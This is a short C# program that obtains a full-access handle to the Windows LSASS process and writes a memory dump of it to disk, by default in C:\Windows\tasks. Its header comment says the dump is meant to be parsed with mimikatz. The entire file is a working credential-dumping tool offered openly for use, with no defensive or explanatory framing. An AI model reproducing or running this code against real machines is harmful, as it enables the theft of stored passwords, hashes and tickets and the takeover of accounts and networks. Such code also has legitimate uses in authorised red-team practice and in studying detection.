/*
Create a dump file from LSASS that can be parsed with mimikatz.
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId
        );

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            int ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam
        );

        static void Main(string[] args)
        {
            string path = "C:\\Windows\\tasks\\lsass.dmp";

            for (int i = 0; i < args.Length - 1; i++)
            {
                if (args[i] == "-o")
                {
                    path = args[i + 1];
                    break;
                }
            }

            Console.WriteLine($"[*] Using path {path}...");

            FileStream dumpFile = new FileStream(path, FileMode.Create);

            // Get LSASS data
            Process[] lsass = Process.GetProcessesByName("lsass");
            if (lsass.Length == 0)
            {
                Console.WriteLine("[-] LSASS process not found.");
                return;
            }

            // Get LSASS PID
            int lsass_pid = lsass[0].Id;

            // Get handle to LSASS
            IntPtr hlsass = OpenProcess(0x001F0FFF, false, lsass_pid);
            if (hlsass == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get handle to LSASS");
                return;
            }

            // Write dump file
            bool dumped = MiniDumpWriteDump(hlsass, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (!dumped)
            {
                Console.WriteLine("[-] Failed to write dump file.");
            }
            else
            {
                Console.WriteLine($"[+] Dump file {path} created successfully! ");
            }
        }
    }
}
